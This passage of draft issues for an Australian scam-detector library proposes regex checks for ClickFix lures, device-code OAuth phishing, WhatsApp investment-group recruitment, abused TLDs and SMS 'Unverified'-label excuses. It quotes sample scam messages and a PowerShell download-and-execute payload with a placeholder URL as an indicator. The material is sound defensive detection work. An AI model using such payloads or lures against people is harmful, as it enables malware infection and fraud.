2. Optionally add regex to `checkSms()` and `checkCustom()` for fuzzy matching:
```typescript
if (/press\s+(win|windows)\s*\+?\s*r\b/i.test(text) || /powershell\s+-[ec]/i.test(text)) {
  flags.push("'Press Win+R' instruction detected — this is ClickFix social engineering: scammers trick you into running malware on your own computer by disguising it as a 'human verification' step");
  score += 50;
}
```

**False-positive risk:** Very low. No legitimate entity communicates via Win+R instructions. Score of +50 is appropriate.

**IOC patterns:**
- Fake CAPTCHA text: "Verifying you are human — please complete the following verification step"
- Common payload: `powershell -c "iex(iwr('https://...'))"` — if the user pastes this, the command itself is detectable

**Sources:**
- https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/clickfix-distributing-vidar-stealer-via-wordpress-targeting-australian-infrastructure
- https://securityboulevard.com/2026/05/australia-warns-of-clickfix-attacks-pushing-vidar-stealer-malware/
- https://thehackernews.com/2026/07/researcher-analyzes-3000-live-clickfix.html

**Roadmap:** `docs/threat-intel/2026-07-05-threat-roadmap.md` (D3)

---

### Issue C: [threat-intel] Detect device code / OAuth phishing language in checkEmail (EvilTokens/Kali365)

**Body:**

**Summary:** Escalated from MEDIUM watchlist (July 1 roadmap T7/D9) to HIGH. The FBI issued advisory PSA260521 on 21 May 2026 about "Kali365" — an OAuth device code PhaaS kit. Tycoon2FA operators (disrupted March 2026) have pivoted to this technique. Confirmed Australian financial services and healthcare organisations affected. The attack uses the *legitimate* `microsoft.com/devicelogin` OAuth endpoint — so no fake site is involved — but the lure email contains distinctive and detectable language.

**Proposed addition to `lib/scamDetector.ts` — `checkEmail()` function:**

Add a dedicated block (not in the flat `REQUEST_WORDS`, as this is email-specific and the phrases need URL-aware context):
```typescript
// Device code / OAuth token phishing (escalated from July 1 watchlist — FBI PSA260521).
// Attackers abuse Microsoft's OAuth device code flow to steal session tokens without
// a fake login page. Victim is sent to legitimate microsoft.com but authorises the
// attacker's device. Refresh tokens survive password resets.
const deviceCodeHit =
  /enter\s+(this\s+)?device\s+code/i.test(text) ||
  /your\s+device\s+code\s+is/i.test(text) ||
  /microsoft\.com\/devicelogin/i.test(text) ||
  /device\s+auth(orization)?\s+code/i.test(text) ||
  /activate\s+(your\s+)?new\s+device/i.test(text) ||
  /verify\s+(your\s+)?new\s+device/i.test(text);
if (deviceCodeHit) {
  flags.push("Device code phishing — scammers abuse Microsoft's OAuth device login flow to steal your account access without a fake login page. Do not enter any code at microsoft.com/devicelogin unless YOU initiated the login.");
  score += 30;
}
```

**False-positive risk:** Low. Legitimate device code emails from Microsoft do exist (e.g. Smart TV login), but they are initiated by the user and don't arrive unexpectedly with urgency framing or government/bank branding.

**IOC subject lines:**
- "Microsoft: New Device Sign-In Requires Verification"
- "Action Required: Authorise New Device Access to Your Account"
- "Microsoft 365: Verify Your New Device"

**Sources:**
- https://thehackernews.com/2026/03/device-code-phishing-hits-340-microsoft.html
- https://www.microsoft.com/en-us/security/blog/2026/04/06/ai-enabled-device-code-phishing-campaign-april-2026/
- https://spycloud.com/blog/device-code-phishing-the-new-aitm-attack-bypassing-mfa/

**Roadmap:** `docs/threat-intel/2026-07-05-threat-roadmap.md` (D4)

---

### Issue D: [threat-intel] Detect WhatsApp investment group pig-butchering recruitment (ASIC/NASC alert)

**Body:**

**Summary:** ASIC media release 26-063MR (May 2026), jointly with the National Anti-Scam Centre, warns that scammers are recruiting pig-butchering victims via WhatsApp "share trading" and "stock tips" groups. This is a distinct variant from the existing task-rating job funnel (`jobSignals`) — it targets the *investment/trading* aspiration, not the *side-gig* aspiration. The AFP and ASIC shut down 95 shell companies linked to these platforms, with confirmed AU losses of $35.8M+ from this variant.

**Proposed addition to `lib/scamDetector.ts` — `checkSms()` function:**

Add a parallel composite check alongside `jobSignals`:
```typescript
// WhatsApp investment group pig-butchering funnel (D5 / ASIC 26-063MR).
// Distinct from jobSignals — targets investment aspiration, not side-gig aspiration.
// Require ≥2 signals, or 1 signal + existing crypto/wallet signal, to reduce FPs.
const investmentGroupSignals = [
  /join\s+(our|the)\s+(trading|stock|investment|crypto)\s+group/i,
  /exclusive\s+(stock|trading|investment)\s+tips?/i,
  /(vip|private)\s+(trading|investment|stock)\s+(signal|group|channel)/i,
  /trading\s+signals?\s+(group|channel|community)/i,
  /we\s+(made|returned|earned)\s+\$?\d+.*\bfrom\s+(tips?|trading)/i,
  /i'?ll?\s+add\s+you\s+(to\s+(our|the)\s+)?(whatsapp|telegram|signal)/i,
].filter((re) => re.test(text)).length;
const hasCryptoSignal = REQUEST_WORDS.some(w => 
  ["crypto", "bitcoin", "wallet", "connect wallet", "sign transaction"].includes(w) && lower.includes(w)
);
if (investmentGroupSignals >= 2 || (investmentGroupSignals >= 1 && hasCryptoSignal)) {
  flags.push("Investment group recruitment pattern — scammers use 'private trading tip' groups as an entry point for pig-butchering investment fraud; real investment groups don't recruit via cold messages");
  score += 30;
}
```

**False-positive risk:** Medium for single signals; composite requirement substantially reduces FP.

**Example IOC messages:**
- `"Hi, I noticed you in a finance forum. I run a VIP crypto trading signal group — we averaged 23% returns last month. Want me to add you?"`
- `"Exclusive stock tips group — we made $8,400 this week. Join our WhatsApp trading community."`

**Sources:**
- https://www.asic.gov.au/about-asic/news-centre/find-a-media-release/2026-releases/26-063mr-asic-ramps-up-action-to-protect-consumers-from-ai-powered-online-investment-scams/
- https://coingeek.com/australia-warns-of-crypto-investment-scams-on-messaging-apps/

**Roadmap:** `docs/threat-intel/2026-07-05-threat-roadmap.md` (D5)

---

### Issue E: [threat-intel] Add .zip, .mov, .lat to SUSPICIOUS_TLDS

**Body:**

**Summary:** Three TLDs actively abused for phishing are not in `SUSPICIOUS_TLDS`:
- **`.zip`** and **`.mov`** (Google-released 2023): Look like file extensions; some browsers/email clients auto-hyperlink file names with these extensions, and URL scanners often miss them
- **`.lat`**: Latin-script TLD with high phishing-to-legitimate ratio, appearing in AU-targeting campaigns in 2025-2026

**Proposed change to `lib/scamDetector.ts`:**

In the `SUSPICIOUS_TLDS` array, add:
```typescript
// File-extension TLDs (Google 2023) — bypasses URL-scanner intuition; no AU legitimate use
".zip", ".mov",
// .lat — high phishing abuse, appearing in AU-targeting campaigns
".lat",
```

**False-positive risk:**
- `.zip` / `.mov`: Low — virtually no legitimate AU consumer service uses these TLDs
- `.lat`: Low — not used by any significant AU legitimate service

**Sources:**
- https://bolster.ai/blog/zip-domain-phishing-and-mov-malware
- https://fieldeffect.com/blog/what-you-should-know-about-the-new-.zip-and-.mov-tlds
- https://socradar.io/blog/top-10-tlds-threat-actors-use-for-phishing/

**Roadmap:** `docs/threat-intel/2026-07-05-threat-roadmap.md` (D6)

---

### Issue F: [threat-intel] Detect SMS "Unverified" sender label override language (ACMA SMS registry bypass)

**Body:**

**Summary:** The ACMA SMS Sender ID Register came into force on 1 July 2026. Registered brands display their name; unregistered senders are labelled "Unverified" on the recipient's device. Scammers are now embedding explanatory text in their messages to pre-empt user suspicion about this label — this is a new, AU-specific, near-zero-FP signal class.

**Proposed additions to `lib/scamDetector.ts`:**

Add a new check in `checkSms()`:
```typescript
// ACMA SMS Sender ID "Unverified" label override language (post-1 July 2026).
// Scammers embed text to explain away the carrier-applied "Unverified" label.
// No legitimate sender needs to tell recipients to ignore a verified-status warning.
const unverifiedOverride =
  /may\s+appear\s+(as\s+)?unverified/i.test(text) ||
  /displayed?\s+as\s+unverified/i.test(text) ||
  /ignore\s+(the\s+)?['"]?unverified['"]?/i.test(text) ||
  /carrier\s+(has\s+not|hasn'?t)\s+updated\s+our\s+(registration|sender)/i.test(text) ||
  /unverified\s+(label|tag|display)\s+is\s+a\s+(carrier\s+)?(error|delay|bug)/i.test(text);
if (unverifiedOverride) {
  flags.push("'Unverified' label override attempt — since 1 July 2026, legitimate Australian senders are required to register their SMS Sender ID with ACMA. A message asking you to ignore an 'Unverified' label is almost certainly a scam.");
  score += 35;
}
```

**False-positive risk:** Very low. No legitimate registered sender ever needs to explain away the "Unverified" display. This is a self-defeating signal for scammers but some will use it anyway.

**Sources:**
- https://www.acma.gov.au/articles/2026-06/sms-sender-id-register-goes-live-help-protect-australians-scams
- https://stateofsurveillance.org/news/australia-sms-sender-id-registration-acma-2026/

**Roadmap:** `docs/threat-intel/2026-07-05-threat-roadmap.md` (D7)
